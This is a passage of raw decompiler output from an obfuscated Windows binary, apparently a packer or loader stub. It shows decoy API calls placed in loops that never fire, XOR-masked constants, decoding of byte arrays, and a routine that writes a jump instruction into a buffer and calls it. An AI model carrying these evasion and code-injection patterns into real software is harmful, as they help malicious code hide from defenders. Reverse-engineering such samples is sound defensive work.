    if ( ++v10 == 30 )
      LookupIconIdFromDirectory((PBYTE)0x1745, fIcon);
  }
  while ( v10 < 0x1C );
  v2 = dword_4070F0;
  *(_BYTE *)off_4080CE[58] -= 59;
  if ( v2 == 1 || !**(_DWORD **)(a1 + 56) )
  {
    v7 = -4099;
  }
  else
  {
    v3 = off_4072D8;
    off_408132->DCBlength |= dword_407FAC;
    v4 = *v3[2];
    v5 = *(_DWORD *)(*(_DWORD *)(v4 + 60) + v4 + 40);
    dword_408054 &= (unsigned int)&stru_40800C.wReserved;
    dword_408054 += (int)&DCB[8];
    dword_408054 |= (unsigned int)&dword_407FC8;
    v6 = v4 + v5;
    if ( v3[16] )
    {
      *off_4080E2[0] -= v10;
      *(_BYTE *)off_407310 = -23;
      stru_408030.wParam = (unsigned int)&dword_407FFC & (unsigned int)Buffer;
      *(_DWORD *)((char *)off_407310 + 1) = v6 + 9513 - (_DWORD)off_407310 - 9518;
      *a2 = off_407310(*off_4072D8[2], dword_4070F0, dword_4070F4);
    }
    dword_40807C &= (unsigned int)&dword_407FC0;
    dword_407100 = 0;
    dword_407104 = 0;
    v7 = -4100;
  }
  return (v7 ^ 0x352F) + 9518;
}
// 403E22: variable 'fIcon' is possibly undefined
// 4070F0: using guessed type int dword_4070F0;
// 4070F4: using guessed type int dword_4070F4;
// 407100: using guessed type int dword_407100;
// 407104: using guessed type int dword_407104;
// 4072D8: using guessed type int **off_4072D8;
// 407310: using guessed type int (__stdcall *off_407310)(_DWORD, _DWORD, _DWORD);
// 407FAC: using guessed type int dword_407FAC;
// 407FC0: using guessed type int dword_407FC0;
// 407FC8: using guessed type int dword_407FC8;
// 407FFC: using guessed type int dword_407FFC;
// 408054: using guessed type int dword_408054;
// 40807C: using guessed type int dword_40807C;
// 4080CE: using guessed type int *off_4080CE[11];
// 4080E2: using guessed type int *off_4080E2[6];
// 408132: using guessed type _DCB *off_408132;
// 4081CA: using guessed type void *off_4081CA;

//----- (00403FB9) --------------------------------------------------------
int __stdcall sub_403FB9(int a1, int a2, int a3)
{
  int v3; // ecx
  int result; // eax
  int *v5; // esi
  int *v6; // esi
  int v7; // ecx
  int *v8; // eax
  int *v9; // esi
  unsigned int v10; // [esp+0h] [ebp-40h]
  unsigned int v11; // [esp+4h] [ebp-3Ch]
  int v12; // [esp+18h] [ebp-28h]
  struct tagFINDREPLACEW *v13; // [esp+1Ch] [ebp-24h]
  int v14; // [esp+24h] [ebp-1Ch]
  int v15; // [esp+28h] [ebp-18h]
  int v16; // [esp+2Ch] [ebp-14h]
  unsigned int v17; // [esp+30h] [ebp-10h]

  v3 = -4099;
  v17 = 0;
  do
  {
    if ( ++v17 == 29 )
      ReplaceTextW(v13);
  }
  while ( v17 < 0x16 );
  result = 33599503;
  do
  {
    v16 |= v15;
    v5 = off_4070D4[((_BYTE)v3 + 1) & 3];
    dword_408028 &= *(_DWORD *)&stru_40800C.wReserved;
    *v5 *= -8200 * v3;
    dword_408078 -= (int)&stru_408030.time;
    dword_408078 &= (unsigned int)&DCB[8];
    v6 = off_4070D4[((_BYTE)v3 - 1) & 3];
    *v6 ^= v3 | result;
    dword_407304 = a1;
    if ( v3 == -4547 )
    {
      dword_407308 = a2;
    }
    else if ( v3 == -4483 )
    {
      dword_40730C = a3;
    }
    v7 = v3 ^ 0x352F;
    if ( __OFSUB__(v11, 34534) )
      v10 = (__PAIR64__(v10, v11) - __PAIR64__(*off_40812E, 34534)) >> 32;
    else
      v14 &= v12;
    v3 = (v7 - 9517 + 9518) ^ 0x352F;
    stru_408030.hwnd = (HWND)((int)stru_408030.hwnd ^ (unsigned int)&stru_408030.wParam);
    stru_408030.hwnd = (HWND)((char *)stru_408030.hwnd + (unsigned int)&dword_408000);
    stru_408030.hwnd = (HWND)((int)stru_408030.hwnd | (unsigned int)&dword_40807C);
    v8 = off_4070D4[v3 & 3];
    *v8 += v3 ^ (-8196 * v3);
    result = -8197 * v3;
    v9 = off_4070D4[((_BYTE)v3 - 2) & 3];
    *v9 |= -8197 * v3;
  }
  while ( v3 != -4403 );
  return result;
}
// 404012: variable 'v13' is possibly undefined
// 40403C: variable 'v15' is possibly undefined
// 40403C: variable 'v16' is possibly undefined
// 404040: variable 'v3' is possibly undefined
// 4040CD: variable 'v11' is possibly undefined
// 4040E3: variable 'v10' is possibly undefined
// 4040F0: variable 'v12' is possibly undefined
// 4040F0: variable 'v14' is possibly undefined
// 4070D4: using guessed type int *off_4070D4[4];
// 407304: using guessed type int dword_407304;
// 407308: using guessed type int dword_407308;
// 40730C: using guessed type int dword_40730C;
// 408000: using guessed type int dword_408000;
// 408028: using guessed type int dword_408028;
// 408078: using guessed type int dword_408078;
// 40807C: using guessed type int dword_40807C;
// 40811E: using guessed type int *off_40811E[5];
// 40812E: using guessed type int *off_40812E;

//----- (0040417E) --------------------------------------------------------
int __usercall sub_40417E@<eax>(int a1@<ebp>, unsigned int a2@<edi>, unsigned int *a3@<esi>)
{
  unsigned int v3; // ecx
  int result; // eax

  do
  {
    *a3 = 1;
    if ( a2 != 1 )
    {
      do
      {
        v3 = *a3;
        if ( *a3 <= a2 )
        {
          if ( v3 )
          {
            dword_40806C = 0;
            do
            {
              if ( ++dword_40806C == 22 )
                SetPaletteEntries(
                  *(HPALETTE *)(a1 - 28),
                  0x402Eu,
                  *(_DWORD *)(a1 - 12),
                  *(const PALETTEENTRY **)(a1 - 32));
            }
            while ( (unsigned int)dword_40806C < 0x15 );
            *a3 = a2 / 0x101 + v3 + 1;
          }
          else
          {
            *a3 = a2;
          }
        }
        else
        {
          *a3 = v3 - 1;
        }
      }
      while ( *a3 != a2 );
    }
    result = InterlockedExchangeAdd(&Target, 7734887) + 7734887;
  }
  while ( result != Target );
  return result;
}
// 4041FB: variable 'v3' is possibly undefined
// 40806C: using guessed type int dword_40806C;

//----- (0040422E) --------------------------------------------------------
LONG __usercall sub_40422E@<eax>(unsigned int a1@<edi>, LONG *a2@<esi>)
{
  LONG result; // eax
  LONG v3; // ecx

  *a2 = 1;
  result = InterlockedExchange(&Target, 7734887);
  while ( *a2 != a1 )
  {
    v3 = *a2;
    if ( *a2 >= a1 )
    {
      if ( v3 )
      {
        *a2 = v3 - 1;
        continue;
      }
    }
    else if ( v3 )
    {
      dword_407FF4 = 0;
      do
      {
        if ( ++dword_407FF4 == 32 )
          RemoveDirectoryA(PathName);
      }
      while ( (unsigned int)dword_407FF4 < 0x1F );
      result = a1 / 0x101 + v3 + 1;
      *a2 = result;
      continue;
    }
    *a2 = a1;
  }
  return result;
}
// 4042A4: variable 'v3' is possibly undefined
// 407FF4: using guessed type int dword_407FF4;

//----- (004042D0) --------------------------------------------------------
int sub_4042D0()
{
  int v0; // eax
  int v2; // [esp+38h] [ebp-Ch]

  *(_DWORD *)&DCB[4] = 0;
  do
  {
    if ( ++*(_DWORD *)&DCB[4] == 45 )
      CreateDCW(pwszDriver, pwszDevice, &szString, (const DEVMODEW *)0x2F1C);
  }
  while ( *(_DWORD *)&DCB[4] < 0x1Fu );
  v2 = (int)*off_407084;
  dword_4072F0 = (int)*off_407080;
  v0 = -4100;
  dword_4072F4 = 4 - dword_4072F0 + v2;
  if ( !dword_4072F0 )
  {
    dword_408064 += *off_40811A[0];
    v0 = -4099;
  }
  return (v0 ^ 0x352F) + 9518;
}
// 407080: using guessed type int (**off_407080)[459];
// 407084: using guessed type int **off_407084;
// 4072F0: using guessed type int dword_4072F0;
// 4072F4: using guessed type int dword_4072F4;
// 408060: using guessed type int dword_408060;
// 408064: using guessed type int dword_408064;
// 40811A: using guessed type int *off_40811A[6];

//----- (004043E1) --------------------------------------------------------
int sub_4043E1()
{
  int v0; // edx
  int *v1; // eax
  HANDLE hFile; // [esp+18h] [ebp-20h]
  int v4; // [esp+30h] [ebp-8h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  v5 = -4099;
  v0 = -4099;
  stru_408030.pt.y = 0;
  do
  {
    if ( ++stru_408030.pt.y == 20 )
      GetCommState(hFile, (LPDCB)DCB);
  }
  while ( stru_408030.pt.y < 0x10u );
  v4 = (v0 ^ 0x352F) + 9518;
  v5 = (int)off_4072D8;
  *(_DWORD *)&DCB[4] = (unsigned int)&stru_40800C.StopBits ^ (unsigned int)&dword_408090;
  v1 = off_4072D8[3];
  dword_407FC4 -= (__PAIR64__(&dword_408078, (unsigned int)off_4072D8) + 318) >> 32;
  return off_407580(off_407584, *v1, (char *)off_4072D8 + 318, 4, dword_4072F0, dword_4072F4, 64, &v4);
}
// 404424: variable 'hFile' is possibly undefined
// 40447B: variable 'v0' is possibly undefined
// 4072D8: using guessed type int **off_4072D8;
// 4072F0: using guessed type int dword_4072F0;
// 4072F4: using guessed type int dword_4072F4;
// 407580: using guessed type int (__cdecl *off_407580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407584: using guessed type int (__stdcall *off_407584)(int, int, int);
// 407FC4: using guessed type int dword_407FC4;
// 408058: using guessed type int dword_408058;
// 408074: using guessed type int dword_408074;
// 408078: using guessed type int dword_408078;
// 408090: using guessed type int dword_408090;

//----- (00404505) --------------------------------------------------------
unsigned int *__stdcall sub_404505(int a1, int a2, void (__stdcall *a3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a4)
{
  unsigned int *result; // eax
  int v5; // [esp+Ch] [ebp-58h]
  int v6; // [esp+58h] [ebp-Ch]
  unsigned int retaddr; // [esp+68h] [ebp+4h] BYREF

  if ( a4 == 550007 )
  {
    a3(off_407580, off_407584, dword_4070EC, dword_4070F0, dword_4070F4, a2, off_4072D8);
  }
  else
  {
    if ( a4 == 203272 )
    {
      v6 = 394281;
    }
    else
    {
      for ( dword_407FA8 = 24; dword_407FA8; --dword_407FA8 )
      {
        if ( dword_407FA8 == 37 )
          ChooseColorW((LPCHOOSECOLORW)0x53A1);
      }
      dword_408004 = (int)&dword_407FCC;
      if ( *off_4072D8[3] && !dword_407090 )
        sub_404AA0();
      v6 = 550007;
    }
    *(_DWORD *)&stru_40800C.wReserved += &Msg.time;
    sub_404505(a1, a2, a3, v6);
  }
  *off_4080DA[0] -= v5;
  result = &retaddr;
  retaddr ^= retaddr + dword_407100;
  return result;
}
// 404667: returning address of temporary local variable '%" r"'
// 404638: variable 'v5' is possibly undefined
// 407090: using guessed type int dword_407090;
// 4070EC: using guessed type int dword_4070EC;
// 407100: using guessed type int dword_407100;
// 4072D8: using guessed type int **off_4072D8;
// 407580: using guessed type int (__cdecl *off_407580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407FA8: using guessed type int dword_407FA8;
// 407FCC: using guessed type int dword_407FCC;
// 408004: using guessed type int dword_408004;
// 4080DA: using guessed type int *off_4080DA[8];

//----- (00404673) --------------------------------------------------------
int __stdcall sub_404673(int a1, int a2)
{
  int v2; // eax
  __int16 v3; // cx
  __int16 v4; // dx
  unsigned int v5; // eax
  int result; // eax
  unsigned int v7; // [esp+5Ch] [ebp-1B8h]
  int v8; // [esp+94h] [ebp-180h]
  int v9; // [esp+DCh] [ebp-138h]
  unsigned __int16 v10; // [esp+FCh] [ebp-118h]
  int v11; // [esp+144h] [ebp-D0h]
  int v12; // [esp+148h] [ebp-CCh]
  unsigned int v13; // [esp+19Ch] [ebp-78h]
  unsigned int i; // [esp+1C0h] [ebp-54h]
  unsigned int v15; // [esp+1C0h] [ebp-54h]
  __int16 v16[3]; // [esp+1C4h] [ebp-50h] BYREF
  int v17; // [esp+1CAh] [ebp-4Ah]
  __int16 v18; // [esp+1CEh] [ebp-46h]
  __int16 v19; // [esp+1D0h] [ebp-44h]
  __int16 v20; // [esp+1D2h] [ebp-42h]
  __int16 v21; // [esp+1D4h] [ebp-40h]
  __int16 v22; // [esp+1D6h] [ebp-3Eh]
  __int16 v23; // [esp+1D8h] [ebp-3Ch]
  __int16 v24; // [esp+1DAh] [ebp-3Ah]
  __int16 v25; // [esp+1DCh] [ebp-38h]
  __int16 v26; // [esp+1DEh] [ebp-36h]
  __int16 v27; // [esp+1E0h] [ebp-34h]
  int v28; // [esp+1E2h] [ebp-32h]
  __int16 v29[4]; // [esp+1E8h] [ebp-2Ch] BYREF
  LPOPENFILENAMEW v30; // [esp+1F0h] [ebp-24h]
  __int16 v31; // [esp+1F4h] [ebp-20h]
  __int16 v32; // [esp+1F6h] [ebp-1Eh]
  __int16 v33; // [esp+1F8h] [ebp-1Ch]
  __int16 v34; // [esp+1FAh] [ebp-1Ah]
  __int16 v35; // [esp+1FCh] [ebp-18h]
  __int16 v36; // [esp+1FEh] [ebp-16h]
  __int16 v37; // [esp+200h] [ebp-14h]
  __int16 v38; // [esp+202h] [ebp-12h]
  __int16 v39; // [esp+204h] [ebp-10h]
  __int16 v40; // [esp+206h] [ebp-Eh]
  __int16 v41; // [esp+208h] [ebp-Ch]
  int v42; // [esp+20Ch] [ebp-8h]
  int v43; // [esp+210h] [ebp-4h]

  v2 = *(int *)((char *)&dword_40749C + a1);
  for ( i = 0; i < 0x1A; ++i )
    ;
  v43 = -4099;
  *(_DWORD *)&DCB[12] ^= v10;
  v42 = (v2 ^ 0x352F) + 9518;
  *(_DWORD *)DCB += v9;
  word_407340[v42] = 0;
  v3 = -259;
  v4 = -751;
  v29[0] = -751;
  v29[1] = -259;
  *(_BYTE *)off_4080E6[0] ^= 0x62u;
  v29[2] = -661;
  v29[3] = -262;
  v30 = (LPOPENFILENAMEW)-17171174;
  v31 = -740;
  v32 = -264;
  Msg.hwnd = (HWND)((char *)Msg.hwnd - *(_DWORD *)&DCB[4]);
  v33 = -663;
  v34 = -265;
  v35 = -762;
  v5 = 65270;
  v36 = -266;
  v37 = -259;
  v38 = -267;
  v13 = 0;
  do
  {
    if ( ++v13 == 30 )
      v5 = PrintDlgExW((LPPRINTDLGEXW)0x7931);
  }
  while ( v13 < 0x13 );
  v39 = 5081;
  v40 = 4824;
  v41 = v5;
  v16[0] = v4;
  v16[1] = v3;
  v18 = v3 - 4;
  v19 = v4 + 7;
  v20 = v3 - 5;
  v21 = v4 + 94;
  v22 = v3 - 6;
  v25 = v3;
  v23 = v4 - 11;
  v26 = v3 - 8;
  *((_DWORD *)&stru_40800C + 2) -= v8;
  v16[2] = v4 + 90;
  v17 = -49152262;
  v24 = v5;
  v27 = -31207;
  v28 = -17400040;
  stru_40800C.BaudRate += v12 + (v7 < v5);
  sub_4068C5((char *)off_407584, *off_4072D8[3], (int)v29, 3);
  result = sub_4068C5((char *)off_407584, *off_4072D8[3], (int)v16, 1);
  *(_DWORD *)DCB += &stru_40800C.wReserved;
  if ( result != (*(int *)((char *)&dword_40749C + a2) ^ 0x352F)
               + (*(int *)((char *)&dword_40749C + a1) ^ 0x352F)
               + 19036 )
  {
    v15 = 0;
    do
    {
      if ( ++v15 == 33 )
        GetOpenFileNameW(v30);
    }
    while ( v15 < 0x11 );
    *(_DWORD *)dword_4074D8 = (v43 ^ 0x352F) + 9518;
    dword_407FBC ^= v11;
    result = (v43 ^ 0x352F) + 9518;
    *off_4072D8[3] = result;
  }
  return result;
}
// 40471D: conditional instruction was optimized away because of '%var_54.4<1Au'
// 404748: variable 'v10' is possibly undefined
// 404791: variable 'v9' is possibly undefined
// 4048E0: variable 'v4' is possibly undefined
// 4048E6: variable 'v3' is possibly undefined
// 404933: variable 'v8' is possibly undefined
// 404988: variable 'v12' is possibly undefined
// 40497F: variable 'v7' is possibly undefined
// 404A82: variable 'v11' is possibly undefined
// 4072D8: using guessed type int **off_4072D8;
// 40749C: using guessed type int dword_40749C;
// 4074D8: using guessed type int dword_4074D8;
// 407FBC: using guessed type int dword_407FBC;
// 407FF8: using guessed type int dword_407FF8;
// 408054: using guessed type int dword_408054;
// 40806C: using guessed type int dword_40806C;
// 408078: using guessed type int dword_408078;
// 4080E6: using guessed type int *off_4080E6[5];

//----- (00404AA0) --------------------------------------------------------
int sub_404AA0()
{
  int v1; // eax
  int v2; // edx
  int v3; // ecx
  char v4; // bl
  int v6; // [esp+34h] [ebp-B0h]
  unsigned __int8 v7; // [esp+40h] [ebp-A4h]
  unsigned __int16 v8; // [esp+74h] [ebp-70h]
  unsigned __int16 v9; // [esp+8Ch] [ebp-58h]
  unsigned __int16 v10; // [esp+A4h] [ebp-40h]
  int i; // [esp+ACh] [ebp-38h]
  int v12; // [esp+B0h] [ebp-34h]
  unsigned int v13; // [esp+B8h] [ebp-2Ch]
  DWORD dwData; // [esp+BCh] [ebp-28h]
  HICON dwDataa; // [esp+BCh] [ebp-28h]
  DWORD v16; // [esp+C4h] [ebp-20h]
  ULONG_PTR dwExtraInfo; // [esp+CCh] [ebp-18h]
  int v18; // [esp+D4h] [ebp-10h]
  DWORD dwFlags; // [esp+D8h] [ebp-Ch]
  char v20; // [esp+E3h] [ebp-1h]

  v13 = 0;
  do
  {
    if ( ++v13 == 27 )
      mouse_event(dwFlags, v16, 0x5257u, dwData, dwExtraInfo);
  }
  while ( v13 < 0x1A );
  dword_408058 = __ROR4__(dword_408058, 1);
  if ( sub_4042D0() )
  {
    sub_4043E1();
    _EDX = v10;
    __asm { rcl     edx, 2 }
    v1 = dword_4072F0;
    v18 = -9518;
    v2 = 0;
    dwDataa = (HICON)dword_4072F4;
    if ( dword_4072F4 )
    {
      do
      {
        v3 = -9517;
        for ( dword_407FF8 = 31; dword_407FF8; --dword_407FF8 )
        {
          if ( dword_407FF8 == 38 )
            v1 = SetBkMode((HDC)0x5790, (int)dwDataa);
        }
        v9 = __ROL4__(v9, 3);
        v20 = *(_BYTE *)(v2 * (v3 + 9518) + v1);
        v12 |= 0x730Eu;
        dword_407FBC -= *(_DWORD *)off_408112;
        v4 = __ROR1__(v20 - 46, 1);
        v6 += 3449;
        dword_408000 += (int)&stru_408030.pt;
        dword_408000 &= (unsigned int)&dword_407FF4;
        *(_BYTE *)(v2 + v1) = 0;
        for ( i = 28; i; --i )
        {
          if ( i == 39 )
            v1 = DrawIcon((HDC)0xFFFFEFFD, -4561, -4099, dwDataa);
        }
        Msg.wParam |= v8;
        ++*(_BYTE *)(v2 + v1);
        *(_BYTE *)(v2 + v1) += v4;
        --*(_BYTE *)(v2 + v1);
        *off_4081B6 &= v7;
        dword_407FB4 += (int)&dword_40807C;
        v18 = v18 - 9517 + 9518;
        v2 = v18 + 9518;
      }
      while ( (HICON)(v18 + 9518) != dwDataa );
    }
  }
  return 0;
}
// 404ADF: variable 'dwFlags' is possibly undefined
// 404ADF: variable 'v16' is possibly undefined
// 404ADF: variable 'dwData' is possibly undefined
// 404ADF: variable 'dwExtraInfo' is possibly undefined
// 404B98: variable 'v10' is possibly undefined
// 404C4E: variable 'v9' is possibly undefined
// 404C4B: variable 'v2' is possibly undefined
// 404C49: variable 'v3' is possibly undefined
// 404C71: variable 'v12' is possibly undefined
// 404D76: variable 'v6' is possibly undefined
// 404DFC: variable 'v8' is possibly undefined
// 404E27: variable 'v7' is possibly undefined
// 407FB4: using guessed type int dword_407FB4;
// 407FB8: using guessed type int dword_407FB8;
// 407FBC: using guessed type int dword_407FBC;
// 407FF4: using guessed type int dword_407FF4;
// 407FF8: using guessed type int dword_407FF8;
// 407FFC: using guessed type int dword_407FFC;
// 408000: using guessed type int dword_408000;
// 408058: using guessed type int dword_408058;
// 40807C: using guessed type int dword_40807C;
// 4080CE: using guessed type int *off_4080CE[11];
// 408112: using guessed type void *off_408112;
// 408152: using guessed type int *off_408152;
// 4081B6: using guessed type int *off_4081B6;

//----- (00404EC0) --------------------------------------------------------
int __usercall sub_404EC0@<eax>(unsigned int a1@<edi>)
{
  unsigned int i; // edx
  char v2; // al
  int v3; // edi
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  char v7; // al
  int v9; // [esp+0h] [ebp-E8h]
  int v10; // [esp+4h] [ebp-E4h]
  unsigned int v11; // [esp+34h] [ebp-B4h]
  __int16 v12; // [esp+78h] [ebp-70h]
  int *lpnFit; // [esp+C4h] [ebp-24h]
  HMENU hMenu; // [esp+C8h] [ebp-20h]
  UINT uFlags; // [esp+D0h] [ebp-18h]
  struct tagSIZE *lpSize; // [esp+D4h] [ebp-14h]
  int v17; // [esp+E4h] [ebp-4h]

  for ( i = 5; i < 0x14; ++i )
  {
    for ( dword_408054 = 0; (unsigned int)dword_408054 < 0x16; ++dword_408054 )
    {
      if ( dword_408054 == 34 )
        AppendMenuA(hMenu, uFlags, 0x16AFu, NewItem);
    }
    if ( dword_407090 )
      break;
    v2 = byte_4074D7[i];
    dword_407FB4 = (__PAIR64__(dword_407FB4, a1) - __PAIR64__((struct tagMSG *)&Msg.pt.y, v11)) >> 32;
    byte_4074D7[i] = (v2 ^ 0x5F) + 49;
  }
  v3 = 0;
  if ( !*off_4072D8[3] )
    v3 = sub_403BC3();
  v4 = -4099;
  do
  {
    v5 = v4 ^ 0x352F;
    v10 -= v9;
    v17 = 2 * v5 + 19036;
    v4 = (v5 + 1) ^ 0x352F;
    *(__int16 *)((char *)&word_4074C4 + v17) = (*(__int16 *)((char *)&word_4074BC + v17) ^ 0x32F) + 558;
  }
  while ( v4 != -4102 );
  if ( v3 )
  {
    for ( dword_407FA8 = 0; (unsigned int)dword_407FA8 < 0x11; ++dword_407FA8 )
    {
      if ( dword_407FA8 == 28 )
        GetTextExtentExPointW((HDC)0x805E, &szString, (int)lpnFit, 9, lpnFit, (LPINT)0x50F7, lpSize);
    }
    v6 = 9;
    do
    {
      *(_DWORD *)&stru_40800C.wReserved = (unsigned __int16)(v12 & stru_40800C.wReserved);
      v7 = (byte_407520[v6 - 9] ^ 0x5F) + 49;
      dword_407FC0 |= (unsigned int)&dword_407FB0;
      byte_407640[v6-- - 9] = v7;
    }
    while ( v6 );
    *off_4072D8[3] = v3;
  }
  return v17;
}
// 404F0B: variable 'hMenu' is possibly undefined
// 404F0B: variable 'uFlags' is possibly undefined
// 404F56: variable 'i' is possibly undefined
// 404F62: variable 'v11' is possibly undefined
// 404FB5: variable 'v10' is possibly undefined
// 404FB5: variable 'v9' is possibly undefined
// 405059: variable 'lpnFit' is possibly undefined
// 405059: variable 'lpSize' is possibly undefined
// 4050B3: variable 'v12' is possibly undefined
// 407090: using guessed type int dword_407090;
// 4072D8: using guessed type int **off_4072D8;
// 4074BC: using guessed type __int16 word_4074BC;
// 4074C4: using guessed type __int16 word_4074C4;
// 407FA8: using guessed type int dword_407FA8;
// 407FB0: using guessed type int dword_407FB0;
// 407FB4: using guessed type int dword_407FB4;
// 407FC0: using guessed type int dword_407FC0;
// 407FC4: using guessed type int dword_407FC4;
// 408050: using guessed type int dword_408050;
// 408054: using guessed type int dword_408054;
// 408060: using guessed type int dword_408060;
// 4080CE: using guessed type int *off_4080CE[11];

//----- (004050E5) --------------------------------------------------------
int __usercall sub_4050E5@<eax>(unsigned int a1@<ebx>, unsigned int a2@<edi>)
{
  int v2; // eax
  int result; // eax
  int i; // edi
  int v5; // eax
  unsigned int v6; // [esp+18h] [ebp-30h]
  __int16 v7; // [esp+20h] [ebp-28h]
  int y; // [esp+24h] [ebp-24h]
  unsigned int v9; // [esp+2Ch] [ebp-1Ch]
  __int16 v10; // [esp+30h] [ebp-18h]
  unsigned int v11; // [esp+34h] [ebp-14h]
  int v12; // [esp+40h] [ebp-8h] BYREF
  struct HDC__ v13; // [esp+44h] [ebp-4h] BYREF
  void *retaddr; // [esp+4Ch] [ebp+4h] BYREF

  v13.unused = 183096;
  v11 = 0;
  do
  {
    if ( ++v11 == 24 )
      SetPixel(&v13, 30881, y, 0);
  }
  while ( v11 < 0x12 );
  stru_408030.message = (__PAIR64__(stru_408030.message, v6) - __PAIR64__(&dword_408084, a1)) >> 32;
  stru_408030.message |= (unsigned int)&stru_408030.pt.y;
  v2 = (int)*off_407058;
  dword_408050 += (int)&DCB[12];
  dword_408050 ^= (unsigned int)&Msg.message;
  dword_408050 += (int)&dword_40806C;
  v12 = v2;
  dword_4074B8 = 0;
  result = sub_4054E3(a2);
  if ( result )
  {
    for ( i = -4360; i != -4100; i = ((i ^ 0x352F) - 1) ^ 0x352F )
    {
      dword_407318 = dword_4074CC;
      *(_DWORD *)&stru_40800C.EofChar = &dword_407FF4;
      dword_40731C = dword_4074D0;
      dword_407320 = unk_4074D4;
      if ( i == -4101 )
      {
        off_4080FA->hwnd = (HWND)((__PAIR64__(off_4080FA->hwnd, v9) - 0x363D0000352Fi64) >> 32);
        *(_DWORD *)dword_4074B8 += dword_407100;
      }
      else if ( i == -4547 )
      {
        dword_407314 = (int)&v12;
        v5 = sub_4052AC();
        if ( (int)&retaddr > 22475 )
          v10 += y + ((unsigned int)&retaddr < 0x57CB);
        else
          LOWORD(y) = v7 | y;
        --v10;
        *(_DWORD *)dword_4074D8 = v5;
      }
      dword_4074B8 = (int)&retaddr;
      result = -9517;
    }
  }
  return result;
}
// 405124: variable 'y' is possibly undefined
// 405140: variable 'v6' is possibly undefined
// 405223: variable 'v9' is possibly undefined
// 405261: variable 'v7' is possibly undefined
// 40526E: variable 'v10' is possibly undefined
// 407058: using guessed type void ***off_407058;
// 407100: using guessed type int dword_407100;
// 407314: using guessed type int dword_407314;
// 407318: using guessed type int dword_407318;
// 40731C: using guessed type int dword_40731C;
// 407320: using guessed type int dword_407320;
// 4074B8: using guessed type int dword_4074B8;
// 4074CC: using guessed type int dword_4074CC;
// 4074D0: using guessed type int dword_4074D0;
// 4074D8: using guessed type int dword_4074D8;
// 407FF4: using guessed type int dword_407FF4;
// 408050: using guessed type int dword_408050;
// 40806C: using guessed type int dword_40806C;
// 408084: using guessed type int dword_408084;
// 4080CE: using guessed type int *off_4080CE[11];
// 4080FA: using guessed type tagMSG *off_4080FA;

//----- (004052AC) --------------------------------------------------------
int sub_4052AC()
{
  int v1; // [esp+18h] [ebp-20h]
  int v2; // [esp+34h] [ebp-4h] BYREF
  char *retaddr; // [esp+3Ch] [ebp+4h] BYREF

  stru_408030.pt.x = 0;
  do
  {
    if ( ++stru_408030.pt.x == 31 )
      UnloadKeyboardLayout((HKL)0x3B49);
  }
  while ( stru_408030.pt.x < 0x17u );
  dword_4070EC = *(&dword_407314 + 1);
  dword_4070F0 = *(&dword_407314 + 2);
  dword_40807C += v1;
  dword_4070F4 = *(&dword_407314 + 3);
  sub_403FB9((int)&v2, *(_DWORD *)dword_407314, (int)off_4072FC);
  if ( sub_4053C3() )
  {
    v2 = 0;
    dword_407098 += 6780263;
  }
  else
  {
    v2 = *off_4072D8[15];
  }
  dword_4072F8 = (int)&retaddr;
  retaddr += dword_407100;
  return v2;
}
// 405330: variable 'v1' is possibly undefined
// 407098: using guessed type int dword_407098;
// 4070EC: using guessed type int dword_4070EC;
// 407100: using guessed type int dword_407100;
// 4072D8: using guessed type int **off_4072D8;
// 4072F8: using guessed type int dword_4072F8;
// 4072FC: using guessed type double (*off_4072FC)();
// 407314: using guessed type int dword_407314;
// 40807C: using guessed type int dword_40807C;

//----- (004053C3) --------------------------------------------------------
int sub_4053C3()
{
  int v0; // ebx
  int v1; // eax
  int v2; // eax
  int v4; // [esp+14h] [ebp-40h]
  unsigned int i; // [esp+38h] [ebp-1Ch]
  void (__stdcall *dwDesiredAccess)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // [esp+40h] [ebp-14h]
  char *retaddr; // [esp+58h] [ebp+4h] BYREF

  for ( i = 0; i < 0x10; ++i )
    ;
  v0 = dword_407308;
  dwDesiredAccess = (void (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dword_40730C;
  v1 = sub_403DE3((int)off_4072D8, (_DWORD *)dword_407304);
  dword_408084 = (unsigned __int8)dword_408084 - v4;
  if ( v1 )
  {
    v2 = -4100;
  }
  else
  {
    sub_404505((int)off_4072D8, v0, dwDesiredAccess, 203272);
    dword_407300 = (int)&retaddr;
    retaddr += dword_407100;
    *(_DWORD *)&stru_40800C.XoffLim &= dword_408000;
    v2 = -4099;
  }
  return (v2 ^ 0x352F) + 9518;
}
// 405412: conditional instruction was optimized away because of '%var_1C.4<10u'
// 405475: variable 'v4' is possibly undefined
// 407100: using guessed type int dword_407100;
// 4072D8: using guessed type int **off_4072D8;
// 407300: using guessed type int dword_407300;
// 407304: using guessed type int dword_407304;
// 407308: using guessed type int dword_407308;
// 40730C: using guessed type int dword_40730C;
// 408000: using guessed type int dword_408000;
// 408084: using guessed type int dword_408084;

//----- (004054E3) --------------------------------------------------------
int __usercall sub_4054E3@<eax>(unsigned int a1@<edi>)
{
  LPVOID v1; // eax
  int *v2; // ecx
  int v3; // eax
  int i; // ecx
  int v5; // ebx
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  bool v9; // cf
  int v11; // [esp-Ch] [ebp-B0h]
  int v12; // [esp-8h] [ebp-ACh]
  unsigned __int8 v13; // [esp+2Ch] [ebp-78h]
  int v14; // [esp+3Ch] [ebp-68h]
  int v15; // [esp+54h] [ebp-50h]
  unsigned int v16; // [esp+5Ch] [ebp-48h]
  int v17; // [esp+60h] [ebp-44h]
  int v18; // [esp+64h] [ebp-40h]
  int v19; // [esp+68h] [ebp-3Ch]
  unsigned int j; // [esp+74h] [ebp-30h]
  unsigned __int16 v21; // [esp+78h] [ebp-2Ch]
  char v22; // [esp+80h] [ebp-24h]
  int v23; // [esp+80h] [ebp-24h]
  void *pvANDPlane; // [esp+84h] [ebp-20h]
  int v25; // [esp+88h] [ebp-1Ch] BYREF
  int *v26; // [esp+8Ch] [ebp-18h]
  int v27; // [esp+90h] [ebp-14h]
  unsigned int v28; // [esp+94h] [ebp-10h]
  HINSTANCE hInst; // [esp+98h] [ebp-Ch]
  signed int v30; // [esp+9Ch] [ebp-8h]
  int v31; // [esp+A0h] [ebp-4h]

